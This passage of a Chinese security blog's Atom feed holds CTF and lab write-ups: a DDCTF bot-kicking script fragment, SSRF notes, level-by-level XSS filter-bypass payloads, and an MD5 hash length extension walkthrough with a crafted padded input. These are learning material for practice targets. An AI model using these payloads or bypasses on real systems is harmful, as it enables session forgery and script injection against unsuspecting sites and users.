class="string">"data"</span>][<span class="number">0</span>][<span class="string">"your_id"</span>]</span><br><span class="line">    player_ticket = r[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"your_ticket"</span>]     <span class="comment">#json解析id与ticket</span></span><br><span class="line">    delete_robot(player_id,player_ticket)           <span class="comment">#使用主账户删除id</span></span><br><span class="line">    time.sleep(<span class="number">0.3</span>)                                 <span class="comment">#短暂休眠避免被封</span></span><br></pre></td></tr></table></figure><p>踢完所有人就会显示flag：</p><p><img src="https://i.loli.net/2019/07/11/5d2617323c0f143580.png" alt="flag效果"></p><h3 id="Hash拓展长度攻击"><a href="#Hash拓展长度攻击" class="headerlink" title="Hash拓展长度攻击"></a>Hash拓展长度攻击</h3><p>这也是在先知上看到的另外一种解法，暂时还没有去研究。</p><h3 id="Mysql弱口令读取"><a href="#Mysql弱口令读取" class="headerlink" title="Mysql弱口令读取"></a>Mysql弱口令读取</h3><p>这属于非预期了，Mysql那题可以实现任意文件读取，听说可以读出吃鸡flag (Mysql那题还不会…)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cdusec.happyhacking.top/?post=49" target="_blank" rel="noopener">CDUSec</a></p><p><a href="https://www.ctfwp.com/articals/2019ddctf.html#web%E7%AD%BE%E5%88%B0%E9%A2%98" target="_blank" rel="noopener">CTF Writeup</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/introduction" target="_blank" rel="noopener">CTF Wiki</a></p><p><a href="https://xz.aliyun.com/t/2657#toc-16" target="_blank" rel="noopener">upload-labs pass-16详解 by Yang</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">客户端session导致的安全问题 by leavesongs</a></p><p><a href="https://www.zhaoj.in/read-5269.html" target="_blank" rel="noopener">DDCTF Web部分wp by zhaoj</a></p><p><a href="https://xz.aliyun.com/t/4843" target="_blank" rel="noopener">DDCTF2019 两道web题解 by sm1le</a></p><p><a href="https://xz.aliyun.com/t/4849" target="_blank" rel="noopener">DDCTF Web Writeup by evoA</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DDCTF的Web基本就到这了，还差一个很有意思的Mysql客户端任意文件读取没能复现出来，有点难受。</p><p>总算是复现完了<del>并没有</del>，学到了很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;DDCTF比赛的时候很自闭，那么复现的就要好好做了:)&lt;/p&gt;
&lt;h2 id=&quot;滴&quot;&gt;&lt;a href=&quot;#滴&quot; class=&quot;headerl
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒六月赛(未完成)</title>
    <link href="https://www.sketchplane.top/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9B/"/>
    <id>https://www.sketchplane.top/2019/07/03/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E8%B5%9B/</id>
    <published>2019-07-03T15:12:04.000Z</published>
    <updated>2019-07-06T18:32:47.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前错过了安恒六月赛，刚好周周练出了，赶紧做一波；另外这两道web题貌似都做过。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="localview"><a href="#localview" class="headerlink" title="localview"></a>localview</h3><p>开局一张图，结果就是我昨天做的xss小游戏第一关的图片，出题人还特意提醒两者无关；题目提示本地，这题好像很久很久很久之前在哪里做过。。。改XFF和host就行。</p><p>PS：这里注意localhost和127.0.0.1的区别</p><h3 id="easypentest"><a href="#easypentest" class="headerlink" title="easypentest"></a>easypentest</h3><p>打开是一段熟悉的代码，大前天的时候研究ylg的入群题，看到这个题目甚是亲切，应该是ssrf。</p><p>我们先用file协议读一下 flag.php ，注意这里php需要二次编码绕过。读出来是一个hint，给了一个路径：/etc/hosts ，于是再去读hosts文件，读出来一个内网ip，访问一下什么都没有，按照之前的经验，这里我们用dict协议来fuzz一下网段和常用端口，就可以发现 172.18.0.2 有文件包含，还开放了25端口。(路径都不知道我包个🔨）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前错过了安恒六月赛，刚好周周练出了，赶紧做一波；另外这两道web题貌似都做过。&lt;/p&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#We
      
    
    </summary>
    
    
    
      <category term="Web &amp; Crypto" scheme="https://www.sketchplane.top/tags/Web-Crypto/"/>
    
  </entry>
  
  <entry>
    <title>XSS小游戏</title>
    <link href="https://www.sketchplane.top/2019/07/02/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <id>https://www.sketchplane.top/2019/07/02/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F/</id>
    <published>2019-07-02T13:13:43.000Z</published>
    <updated>2019-07-02T15:35:26.557Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天实(上)训(课)的时候，老师要求的代码上午就写完了，于是下午水水群，翻翻博客，发现了这个XSS小游戏，玩了一下。</p><p><a href="http://test.xss.tv/" target="_blank" rel="noopener">题目地址</a></p><h2 id="各关payload"><a href="#各关payload" class="headerlink" title="各关payload"></a>各关payload</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>没有任何过滤，输出的name可控，直接写语句</p><p><code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><code>name=&lt;svg onload=alert(1)&gt;</code></p><p><code>name=&lt;a href=javascript:alert(1)&gt;click me&lt;/a&gt;</code></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>插入点在属性值的双引号里，闭合双引号即可</p><p><code>keyword=&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><code>keyword=&quot;&gt; &lt;svg onload=alert(1)&gt;&quot;</code></p><p><code>keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;click me&lt;/a&gt;&quot;</code></p><p><code>keyword=&quot; onmouseover=alert(1) &quot;</code></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>和第二关差不多，不过是单引号闭合，而且过滤了&gt;号，就不考虑用标签了，因为事件还能用</p><p><code>keyword=&#39; onmouseover=alert(1) &#39;</code></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>事件还能用，&lt;&gt; 都被过滤了，双引号闭合</p><p><code>keyword=&quot; onmouseover=alert(1) &quot;</code></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>on 换成了 o_n，script 换成了 scr_ipt，这里有几个思路：干脆不用、大小写绕过、编码(只有第一个有用)</p><p><code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;click&lt;/a&gt;</code></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>先试了试上一关payload，href 变成了 hr_ef，这时候再试试大小写，成了；反手试了一下直接大小写，也行</p><p><code>&quot;&gt; &lt;a hRef=javascript:alert(1)&gt;click&lt;/a&gt;</code></p><p><code>&quot;&gt; &lt;scRipt&gt;alert(1)&lt;/scRipt&gt;</code></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>再上一波第五关的payload，发现script置空了；试其他payload，on也置空了，但是script的有点玄乎，双写也置空；这里双写成oonn</p><p><code>&quot; oonnmouseover=alert(1) &quot;</code></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>插入点在&lt;a&gt;标签的href属性里，同样javascript 变成 javascr_ipt；这里大小写没用，转换编码有用</p><p><code>javasc&amp;#114;ipt:alert(1)</code></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>脑洞题：需要payload里有 http:// 不然显示非法链接，这里还是转换编码，在alert中包含 http://</p><p><code>javasc&amp;#114;ipt:alert(&amp;#34http://&amp;#34)</code></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>有个form表单隐藏了三个输入框，其中t_sort可控，作为插入点，并且貌似没有过滤，只是看你有没有看到。。。</p><p><code>t_sort=&quot; onmouseover=alert(1) &quot;</code></p><h3 id="第十一、十二、十三关"><a href="#第十一、十二、十三关" class="headerlink" title="第十一、十二、十三关"></a>第十一、十二、十三关</h3><p>统一是抓包，分别改referer、ua、cookie，没有过滤。</p><h3 id="后面的题目"><a href="#后面的题目" class="headerlink" title="后面的题目"></a>后面的题目</h3><p>总共有20关，貌似从这里开始就…挂了???</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/r00tuser/p/7407459.html" target="_blank" rel="noopener">完整题解</a></p><p><a href="https://xz.aliyun.com/t/2936" target="_blank" rel="noopener">XSS注入小结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天实(上)训(课)的时候，老师要求的代码上午就写完了，于是下午水水群，翻翻博客，发现了这个XSS小游戏，玩了一下。&lt;/p&gt;
&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Hash长度拓展攻击</title>
    <link href="https://www.sketchplane.top/2019/06/05/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>https://www.sketchplane.top/2019/06/05/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2019-06-05T15:11:39.000Z</published>
    <updated>2019-06-06T01:09:56.475Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到smi1e师傅的一篇博客，感觉挺有意思，就学习并记录了一下。</p><h2 id="Hash算法简介"><a href="#Hash算法简介" class="headerlink" title="Hash算法简介"></a>Hash算法简介</h2><p>Hash加密算法，又叫散列算法或者摘要算法；是一种通过单向函数加密明文生成消息摘要的算法。</p><p>常见的Hash函数有md5和sha-1，这里我们着重讲一下md5。</p><p>hash函数获得字符串输入时，需要先将消息进行分组，分组长度为512位，也就是64字节；另外加密字符串的长度需要满足<strong>M mod 512 == 448</strong>，若不满足则对分组进行<strong>字符填充</strong>，输出128位，一般转为32位的16进制表示。</p><h3 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h3><p>前面已经说过，当需要进行消息摘要的明文长度不满足与448模512同余时，需要进行补位。这里需要注意的是：<strong>补位是必须进行的操作；即使消息长度刚好为448bit，一样需要补位，并且补位的长度为512bit</strong>。</p><p>补位的方式是在消息的后面加上一个1，然后无限补0，直到满足 M mod 512 == 448。</p><p>在十六进制下，我们需要在消息的后面补80，因为(hex)80 = (bin)10000000，然后一直补0，直到448位。</p><p><img src="https://i.loli.net/2019/06/06/5cf7fa49933ce14008.png" alt="补位完成"></p><h3 id="储存长度"><a href="#储存长度" class="headerlink" title="储存长度"></a>储存长度</h3><p>为什么补位只补到448位(即56字节)呢？<strong>因为剩下的8字节用来储存原消息的长度，单位为bit*</strong>。</p><p>这里强调一点：<strong>MD5的存储方式为小端存储</strong></p><p>用一句话来概括就是数据的高位字节保存在高地址，低位字节保存在低地址；</p><p>相反大端存储就是数据的高位字节保存在低地址，低位字节保存在高地址。</p><p>例如有一串数据为：0x12 34 56 78</p><p>那么在MD5运算中的存储顺序为：0x78 56 34 12</p><p>所以我在Winhex上的例子中，消息长度为17字节，136位，十六进制为<strong>88</strong>所以应该如下填充：</p><p><img src="https://i.loli.net/2019/06/06/5cf7fa671546081371.png" alt="填充完成"></p><p>详细了解：<a href="https://www.cnblogs.com/Alandre/p/4878841.html" target="_blank" rel="noopener">大小端存储</a></p><h3 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h3><p>当准备工作都好了，每个分组都是512bit后，就会开始进行加密运算。</p><p>加密的具体细节有点复杂，这里我只大体讲一下加密模式，以及什么情况下存在可利用点。</p><p><img src="https://i.loli.net/2019/06/06/5cf7fa84077d913283.png" alt="加密流程"></p><p>根据加密流程图可以发现，<strong>每一轮的加密密钥为上一轮加密后的输出</strong>(第一轮由给定的初始链变量作为密钥)， 这个我们一般称为密文链接模式。</p><p>如果我们已知上一轮的加密密钥(即上一轮的hash值)，通过添加字符拓展消息长度使得MD5进行多一轮的加密运算，很容易可以得到新的hash值来绕过某些过滤。</p><h2 id="Hash长度拓展攻击的实现"><a href="#Hash长度拓展攻击的实现" class="headerlink" title="Hash长度拓展攻击的实现"></a>Hash长度拓展攻击的实现</h2><p>ISCC2018的一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>]; <span class="comment">//POST传参</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);<span class="comment">//关键代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;<span class="comment">//要求出md5($key.$username)的hash值</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;<span class="comment">//传参中还要有"admin"</span></span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//已知 md5($key."guest")</span></span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    <span class="comment">//已知$key的长度</span></span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过抓包我们可以知道：</p><p>md5($key.”guest”)=f8d7a112644f7e71e1e8ad068f144f61</p><p>len($key)=21</p><p>下面我们来进行哈希拓展长度攻击。</p><h3 id="长度拓展"><a href="#长度拓展" class="headerlink" title="长度拓展"></a>长度拓展</h3><p>补位，因为$key是21字节长度，我们用21个’x’来暂时代替key的值；紧跟着的是字符串’guest’，然后根据补位方法把消息补到448bit，然后计算数据长度：hex( (21+5)*8 ) =0xD0，然后根据小端储存填充剩余位数。</p><p><img src="https://i.loli.net/2019/06/06/5cf7fb325e2f181268.png" alt="补充完成"></p><p>然后因为代码要求POST的值要有”admin”，我们添加一个”admin”作为拓展。</p><p><img src="https://i.loli.net/2019/06/06/5cf7fad44ac5076019.png" alt="拓展完成"></p><p>然后去掉前面设的x，得到最终的$username。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xD0\x00\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure><p>这里注意要把hex转换为url编码，用python将r’\x’替换成’%’即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d0%00%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure><p>接下来为了让判断成立，我们计算出拓展之后的cookie为多少。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])</span><br></pre></td></tr></table></figure><p>这里直接用hashpump可以直接跑出来.</p><p><img src="https://i.loli.net/2019/06/06/5cf7fb4b7bee247803.png" alt="hashpump脚本跑出md5"></p><p>得到我们需要的cookie值，即$_COOKIE[‘verify’]。</p><p>这样就满足了所有条件，最后得到flag。</p><p><img src="https://i.loli.net/2019/06/06/5cf7fb587d88f66926.png" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，hash拓展长度攻击就是在未知被加密的数据$key、但是md5()函数输入的消息长度可控、而且已知被加密的位数和相应的消息摘要，通过拓展被加密数据的长度，将原信息摘要作为密钥输入，对拓展后数据生成新的摘要，从而满足过滤条件。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;看到smi1e师傅的一篇博客，感觉挺有意思，就学习并记录了一下。&lt;/p&gt;
&lt;h2 id=&quot;Hash算法简介&quot;&gt;&lt;a href=&quot;#Hash算
      
    
    </summary>
    
    
    
      <category term="Crypto" scheme="https://www.sketchplane.top/tags/Crypto/"/>
    
  </entry>
  
</feed>
